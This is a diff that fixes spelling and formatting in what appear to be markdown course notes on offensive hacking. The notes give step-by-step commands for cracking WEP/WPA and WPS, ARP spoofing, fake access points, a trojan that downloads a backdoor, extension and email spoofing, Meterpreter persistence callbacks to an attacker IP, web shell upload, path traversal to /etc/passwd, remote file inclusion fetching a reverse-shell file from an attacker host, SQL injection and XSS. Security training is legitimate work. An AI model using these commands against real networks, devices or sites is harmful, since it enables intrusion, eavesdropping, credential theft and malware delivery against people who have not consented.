@@ -96,7 +96,7 @@ This IV is sent in plain text with the packet for the receiver to decrypt it, an
 
 ### NOT Busy Network
 
-* Associate with the target network (tell the network that I wnat to connect to it)
+* Associate with the target network (tell the network that I want to connect to it)
 * Fake Auth (Associate)
   * `aireplay-ng --fakeauth 0 -a <network bssid> -h <wireless adapter MAC> wlan0mon`
 * Packet Injection
@@ -104,34 +104,17 @@ This IV is sent in plain text with the packet for the receiver to decrypt it, an
 
 ## Crack WPA/WPA2
 
-The successor of WEP is WPA, that stands 
-for Wi-Fi Protected Access, and is much 
-more secure than the other one.
+The successor of WEP is WPA, that stands for Wi-Fi Protected Access, and is much more secure than the other one.
 
-WPA also uses the RC4 algorithm to 
-encrypt the packets, but it uses TKIP 
-(Temporal Key Integrity Protocol) to 
-generate the keystreams. The IV 
-of this method is larger and encrypted. 
-This way each packet has its own key that 
-is encrypted.
+WPA also uses the RC4 algorithm to encrypt the packets, but it uses TKIP (Temporal Key Integrity Protocol) to generate the keystreams. The IV of this method is larger and encrypted. This way each packet has its own key that is encrypted.
 
-WPA2 on the other hand uses the AES 
-algorithm in combination with CCMP to 
-ensure packet integrity.
+WPA2, on the other hand, uses the AES algorithm in combination with CCMP to ensure packet integrity.
 
 ### With WPS
 
-WPS (Wi-Fi Protected Setup) is a method 
-of authenticating with the router without 
-entering the key. When the WPS button on 
-the router and on the device that wants 
-to connect to the network are pressed, a 
-8-bit pin is shared from the router to 
-the device, and then it can connect.
+WPS (Wi-Fi Protected Setup) is a method of authenticating with the router without entering the key. When the WPS button on the router and on the device that wants to connect to the network are pressed, an 8-bit pin is shared from the router to the device, and then it can connect.
 
-A brute force attack cam be used to get 
-this pin and then get the WPA key.
+A brute force attack can be used to get this pin and then get the WPA key.
 
 * If wash is not working
   * `mkdir /etc/reaver`
@@ -144,26 +127,16 @@ this pin and then get the WPA key.
 
 ### Without WPS
 
-If the WPS is disabled or is configured 
-to use push buttom authentication (PBC), 
-then you will have to crack the WPA key.
+If the WPS is disabled or is configured to use push button authentication (PBC), then you will have to crack the WPA key.
 
-Beacause the keystream is temporary we 
-can't use it to crack the password. The 
-only packets that contain useful 
-information are the handshake packets.
+Because the keystream is temporary we can't use it to crack the password. The only packets that contain useful information are the handshake packets.
 
-Handshakes are four packets that are 
-transfered between the client and the 
-router when the client connects to the 
-network.
+Handshakes are four packets that are transferred between the client and the router when the client connects to the network.
 
-To crack it you need to capture these 
-packets and crack the key using a 
-wordlist.
+To crack it you need to capture these packets and crack the key using a wordlist.
 
 * Start airodump-ng in the target
-* Deauth a client to capture the WPA Hanshake
+* Deauth a client to capture the WPA Handshake
 * Crack the Key
   * `aircrack-ng <handshake-file> -w <word-list>`
 
@@ -173,11 +146,7 @@ wordlist.
 
 ## Information Gathering
 
-After authenticating to a network you 
-gather information about it. Discover 
-which clients are connected, wich ports 
-are opened and what are the services 
-running on that port.
+After authenticating to a network you gather information about it. Discover which clients are connected, which ports are opened and what are the services running on that port.
 
 ### Using Netdiscover
 
@@ -196,53 +165,34 @@ running on that port.
 
 * run `zenmap`
 * in Target put `<network internal IP>.1/24`
-* play arround with Profile
+* play around with Profile
 
-## Man In The Middle (MITM) Atacks
+## Man In The Middle (MITM) Attacks
 
-A MITM attack is simply someone in the 
-middle of your connection with a client 
-or a router. When packets are sent 
-between these devices the MITM can 
-capture all of them and read its content.
+A MITM attack is simply someone in the middle of your connection with a client or a router. When packets are sent between these devices the MITM can capture all of them and read its content.
 
-With all the attacks that intercept data 
-from a client to a server, if it uses 
-HTTPS you can't see the information 
-because it is encrypted.
+With all the attacks that intercept data from a client to a server, if it uses HTTPS you can't see the information because it is encrypted.
 
 ### ARP Poisoning Using arpspoof
 
-One method to become the MITM is to use 
-ARP spoofing.
+One method to become the MITM is to use ARP spoofing.
 
-ARP stand for Address Resolution Protocol 
-and it links the IPs of the 
-clients on the network with their MACs.
+ARP stands for Address Resolution Protocol and it links the IPs of the clients on the network with their MACs.
 
-The client sends a ARP request in ths 
-network looking for a certaind IP. The 
-client which has that IP send an ARP 
-response which contains his MAC address.
+The client sends an ARP request in the network looking for a certain IP. The client which has that IP send an ARP response which contains his MAC address.
 
-Each computer has an ARP table containing 
-IPs and MACs. But an ARP response can be 
-sent without the need of its request. 
-Therefore, the attacker can tell the 
-target client that he is the router and 
-tell the router that he is the target 
-client, becoming the MITM.
+Each computer has an ARP table containing IPs and MACs. But an ARP response can be sent without the need of its request. Therefore, the attacker can tell the target client that he is the router and tell the router that he is the target client, becoming the MITM.
 
 * Tell the target client that I am the router
   * `arpsoof -i wlan0 -t <target client IP> <router IP>`
 * Tell the router that I am the target client
   * `arpsoof -i wlan0 -t <router IP> <target client IP>`
-* Enable IP forward to allow packets to flow trough my device without being dropped
+* Enable IP forward to allow packets to flow through my device without being dropped
   * `echo 1 > /proc/sys/net/ipv4/ip_forward`
 
 ### ARP Poisoning Using MITMf
 
-* Tell the target client that I am router
+* Tell the target client that I am the router
   * `mitmf --arp --spoof --gateway <router IP> --target <target client IP> -i wlan0`
 
 This way you can see all the post request made by the target client.
@@ -288,7 +238,7 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
 
 * You need to have internet connection and a wireless card to broadcast it.
   * `apt install mana-toolkit`
-* Edit the files bellow. Change the interface and the ssid. After change the upstream and the phy.
+* Edit the files below. Change the interface and the ssid. Then, change the upstream and the phy.
   * `nano /etc/mana-toolkit/hostpad-mana.conf`
   * `nano /usr/share/mana-toolkit/run-mana/start-nat-simple.sh`
 * Start the network
@@ -296,11 +246,11 @@ If the user clicks on the "remember me" button a cookie is made in the browser. 
 
 ### Wireshark
 
-Use Wireshark to sniff the traffic of a network card. If tou are the MITM you can sniff the trafic of the target computet too.
+Use Wireshark to sniff the traffic of a network card. If you are the MITM you can sniff the traffic of the target computer too.
 
 # Gaining Access
 
-## Server Side Attacks
+## Server-Side Attacks
 
 Don't require user interaction. All is needed is the target IP.
 If you can ping the IP, go and hack it.
@@ -313,7 +263,7 @@ Metasploit is an exploit development and execution tool.
 
 It can also be used to carry out other penetration testing tasks such as port scans, service identification and post exploitation tasks.
 
-Payloads are small pieces of code that will be executed on the target computer ounce the vunerability has been exploited.
+Payloads are small pieces of code that will be executed on the target computer ounce the vulnerability has been exploited.
 
 **Bind** payloads: open a port on the target computer and the attacker connects to that port.
 
@@ -352,7 +302,7 @@ After the setup go to project, create a new project, scan the target and launch 
 ### Nexpose
 Nexpose is a vulnerability management framework, it allows us to 
 discover, assess and act on discovered vulnerabilities, it also tells us a lot 
-of info about the discovered vulnerabilities, weather they are exploitable 
+of info about the discovered vulnerabilities, whether they are exploitable 
 and helps us write a report at the end of the assessment.
 
 To download it [click here](http://www.rapid7.com/products/nexpose/compare-downloads.jsp)
@@ -370,7 +320,7 @@ Log in and put the activation key.
 After the setup go to home, create, site, add a name, the IP in assets and a group, 
 save & scan. Play with the tabs.
 
-## Client Side Attacks
+## Client-Side Attacks
 If you can't ping the target IP or it's hidden behind a router use this attack.
 
 It requires user interaction and Social Engineering is very important 
@@ -456,67 +406,53 @@ We need to be in the middle of the connection.
 ### Maltego - Social Engineering
 Maltego is an information gathering tool that can be used to collect information about anything.
 The target can be a website, company, person, and do on. You can discover entities 
-associated with the taget and everything will be displayed on a nice graph.
+associated with the target and everything will be displayed on a nice graph.
 
 ### Make a Trojan
 
-A Trojan is a simple file that seems to be normal but has malicious code in it, in this case a backdoor will be injected in this file.
+A Trojan is a simple file that seems to be normal but has malicious code in it, in this case, a backdoor will be injected into this file.
 
-The target will receive a file with a backdoor, when this file is opened 
-the backdoor will be executed in the background.
+The target will receive a file with a backdoor, when this file is opened the backdoor will be executed in the background.
 
-This will be done with a download and execute script which will download 
-the file and the backdoor.
+This will be done with a download and execute script which will download the file and the backdoor.
 
-In the script, change `url1` with the real file url and the `url2` with the 
-backdoor url.
+In the script, change `url1` with the real file url and the `url2` with the backdoor url.
 
-Then the script needs to be compiled with Autoit, software and programming language that the script was written in. 
-Change the script extension to `.au3`. Select the source, destination and icon 
-for the backdoored file and convert it.
+Then the script needs to be compiled with Autoit, software and programming language that the script was written in. Change the script extension to `.au3`. Select the source, destination, and icon for the backdoored file and convert it.
 
 ### Spoof File Extensions
 
-To spoof file extensions use the Right-to-Left Override character.
-This way you can make a `.exe` file looks like a `.jpg` file.
+To spoof file extensions use the Right-to-Left Override character. This way you can make a `.exe` file looks like a `.jpg` file.
 
-Beacause some browser are removing this character you can compress 
-the file to keep the spoofed extension.
+Because some browsers are removing this character you can compress the file to keep the spoofed extension.
 
 ### Spoof Emails
 
-Email spoofing is the ability to email someone with a any email address.
+Email spoofing is the ability to email someone with any email address.
 
-This can be achived using a trusted email service to send the email.
-You can use a webhosting account, create your mail server or use a SMTP server.
+This can be achieved using a trusted email service to send the email. You can use a web hosting account, create your mail server or use an SMTP server.
 
-A good and free SMTP server is [Sendgrid](https://sendgrid.com).
-Sign up for the free plan, click in integrate using SMTP relay and generate a key.
+A good and free SMTP server is [Sendgrid](https://sendgrid.com). Sign up for the free plan, click in integrate using SMTP relay and generate a key.
 
-Then use the program`sendemail` to send the spoofed email.
-The authentication will be done with the username and password generated by Sendgrid, 
-put the from and to emails, the subject, message and the header.
+Then use the program`sendemail` to send the spoofed email. The authentication will be done with the username and password generated by Sendgrid, put the from and to emails, the subject, message, and the header.
 
 `sendemail -s [server:port] -xu [user] -xp [password] -f [from email] -t [to email] -u [subject] -m [message] -o message-header="From: [name] <email>"`
 
 ### BeEf
 
-BeEF is a Browser Exploitation Framework that allows to perform a nuber of attacks on a hooked target.
-To hook someone the target needs to load a hook script generated by BeEF.
+BeEF is a Browser Exploitation Framework that allows performing a number of attacks on a hooked target. To hook someone the target needs to load a hook script generated by BeEF.
 
 Once you start BeEF a URL for the web interface will be shown as well as the hook script.
 
 To hook someone you can use DNS spoofing, inject the hook.js file using MITM or Social Engineer.
 
-When the target is hooked you can execute commands on the target browser.
-You can search things to do in the `Commands` tab.
+When the target is hooked you can execute commands on the target browser. You can search for things to do in the `Commands` tab.
 
 Note: some commands just work in `http` protocol.
 
-## Post Explotation
+## Post Exploitation
 
-After the attacker gains access to the target computer, the attacker 
-have full control over the computer, everything can be done.
+After the attacker gains access to the target computer, the attacker has full control over the computer, everything can be done.
 
 ### Meterpreter
 
@@ -546,7 +482,7 @@ have full control over the computer, everything can be done.
 
 ### Migrate Process
 
-When you hack into a it is a good idea to migrate the original process to a safer one like the `explorer` which is the graphical interface of Windows.
+When you hack into a device, it is a good idea to migrate the original process to a safer one like the `explorer` which is the graphical interface of Windows.
 
 `migrate [PID]`
 
@@ -559,7 +495,7 @@ When you hack into a it is a good idea to migrate the original process to a safe
   * In the meterpreter session run `run persistence -U -i [seconds] -p [port(80)] -r [attacker IP]`
   * This is detectable by Antiviruses.
 * Method 3 - Metasploit + Veil
-  * The backdor will be injected as a service and the computer will try to connect to the attacker
+  * The backdoor will be injected as a service and the computer will try to connect to the attacker
   every time the target powers on his computer.
   * `use exploit/windows/local/persistence`
   * `options`
@@ -568,7 +504,7 @@ When you hack into a it is a good idea to migrate the original process to a safe
   * `show advanced`
   * `set EXE::Custom [payload path]`
   * `exploit`
-  * Now you just have to listen for incomming connections and a session will be opened.
+  * Now you just have to listen for incoming connections and a session will be opened.
  
 ### Pivoting
 
@@ -587,7 +523,7 @@ To do this a route needs to be set up between the attacker and the target. Then 
 
 A Website is a server that when accessed retrieves a web page.
 
-When your browser requests a web site, the URL is translated to an IP address by a DNS server, then the IP is sent back to your computer and then the computer will connect with the server and the server will give back a response for the computer.
+When your browser requests a website, the URL is translated to an IP address by a DNS server, then the IP is sent back to your computer and then the computer will connect with the server and the server will give back a response for the computer.
 
 There can be two types of IP addresses. When the server hosts only one website this site has a **dedicated IP**. When the server hosts various websites these sites have **shared IPs**.
 
@@ -598,7 +534,7 @@ When a website uses a Shared Web Hosting plan, if a direct attack to the website
 ### Information Gathering
 
 **Information to be collected** 
-* IP Addess
+* IP Address
 * Domain name info
 * Technologies used
 * Other websites on the same server
@@ -615,9 +551,9 @@ When a website uses a Shared Web Hosting plan, if a direct attack to the website
 
 ### Subdomains
 
-Subdomain is a domain that is part of a larger domain. At `mail.google.com` , `mail` is the subdomain of `google.com`. Note that these are not shown in search engines. The root subdomain is `www`.
+A subdomain is a domain that is part of a larger domain. At `mail.google.com` , `mail` is the subdomain of `google.com`. Note that these are not shown in search engines. The root subdomain is `www`.
 
-These subdomains can contain vulnerabilities that will allow to hack the website.
+These subdomains can contain vulnerabilities that will allow hacking the website.
 
 To find subdomains on the target use Knock.
 
@@ -627,7 +563,7 @@ To find subdomains on the target use Knock.
 
 ### Find Files
 
-To find files and directories on a webserver use Dirb with a wordlist to brute force file and directory names that may be on the website.
+To find files and directories on a web server use Dirb with a wordlist to brute force file and directory names that may be on the website.
 
 * `dirb [target website]`
 
@@ -637,16 +573,12 @@ After that, analyze the files and look for something useful like `robots.txt` th
 
 #### File Upload
 
-This vulnerability allows the client to upload ANY file, so you can upload a shell in a programming language 
-that the server understands and get control over the target.
+This vulnerability allows the client to upload ANY file, so you can upload a shell in a programming language that the server understands and get control over the target.
 
-To generate a PHP shell, Weevely can be used, 
-but you can upload any file like a 
-meterpreter payloads.
+To generate a PHP shell, Weevely can be used, but you can upload any file like a meterpreter payloads.
 
 * Generate the payload
-  * `weevely generate [password] [file 
-name]`
+  * `weevely generate [password] [file name]`
 * Upload the file
 * Start the payload
   * `weevely [file url] [password]`
@@ -665,9 +597,7 @@ Input to make a Ping (ie)
 
 This allows the client to read any file that is on the target server.
 
-It can be seen in the url, if in it there is something like 
-`https://website.com/upload/?page=index.php` it means that the website is accessing a 
-file on the server, so you can type any path in there and get files.
+It can be seen in the url, if in it there is something like `https://website.com/upload/?page=index.php` it means that the website is accessing a file on the server, so you can type any path in there and get files.
 
 To test it try to load the `passwd` file `https://website.com/upload/?page=../../../../etc/passwd`
 
@@ -679,8 +609,7 @@ If the server adds the `.php` at the end of the file automatically, like so `<?p
 If the server turned on the functions `allow_url_include` and `allow_url_fopen`, the attacker can upload any file from any 
 server to the target.
 
-For this to work, make a php file that gives you a reverse connection to the target and save it as `.txt`. Then put 
-this on you server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`
+For this to work, make a php file that gives you a reverse connection to the target and saves it as `.txt`. Then put this on your server, copy the link to the file and paste in the string like so `https://website.com/upload/?page=http://192.168.10.26/php-reverse.txt?`
 
 ### SQL Injection
 
@@ -723,7 +652,7 @@ When the inputs are passed by GET Method they are sent in the URL like so: `http
 
 So the variable `username` has a value of `hello` and `password` has a value of `world`. These variables are going to be passed to the server and run a SQL query, so you can inject code on them too.
 
-It is important to note that when the code is been injected into the browser it has to be encoded because the URL only works with encoded characters. Search for a URL Encoder Decoder to encode the signs that you pass to the URL.
+It is important to note that when the code is been injected into the browser it has to be encoded because the URL only works with encoded characters. Search for a URL Encoder-Decoder to encode the signs that you pass to the URL.
 
 You can also try to encode the code with HTML Entity Encoder Decoder.
 
@@ -814,45 +743,23 @@ Type `sqlmap --help` to see options and use these options to attack the server.
 
 ### Cross Site Scripting (XSS)
 
-XSS is a type of vulnerability that 
-allows an attacker to inject JavaScript 
-code into a page. This code will not be 
-execute on the server, because JavaScript 
-is a client-side language, so the server 
-will be the deliver agent of the code.
+XSS is a type of vulnerability that allows an attacker to inject JavaScript code into a page. This code will not be executed on the server, because JavaScript is a client-side language, so the server will be the delivery agent of the code.
 
-There are 3 main categories of XSS 
-vulnerabilities, stored, reflected and 
-DOM based.
+There are 3 main categories of XSS vulnerabilities, stored, reflected and DOM based.
 
 #### Persistent/Stored
 
-In this type of XSS the script is stored 
-on the server, it can be on the page or 
-on the database. So whenever a client 
-access that page the code will run.
+In this type of XSS, the script is stored on the server, it can be on the page or on the database. So whenever a client access that page the code will run.
 
-This can be exploited by looking for a 
-place where you can write something on 
-the database like a comment box, sign up 
-and sign in forms.
+This can be exploited by looking for a place where you can write something on the database like a comment box, sign up and sign in forms.
 
-Write the script on those inputs and they 
-will be stored in the database. Once the 
-page loads the DB, the code will be 
-executed.
+Write the script on those inputs and they will be stored in the database. Once the page loads the DB, the code will be executed.
 
 #### Reflected
 
-In this type, the the code will be 
-executed when the target user runs a spefic URL 
-created by the attacker.
+In this type, the code will be executed when the target user runs a specific URL created by the attacker.
 
-To search this vulnerability look for 
-URLs with parameters and try to inject 
-the script into these parameters in 
-various forms, encoding the characters 
-and using HTML entities.
+To search this vulnerability look for URLs with parameters and try to inject the script into these parameters in various forms, encoding the characters and using HTML entities.
 
 `https://page.com/search?name='Bob'`
 
@@ -861,11 +768,8 @@ is here")</script>'`
 
 #### DOM Based
 
-With his type of vulnerability the code 
-is executed on the client with no need to 
-send it to the server.
+With his type of vulnerability, the code is executed on the client with no need to send it to the server.
 
 ### Zed Attack Proxy (ZAP)
 
-ZAP is a tool that search for 
-vulnerabilities in web application.
+ZAP is a tool that searches for vulnerabilities in web application.
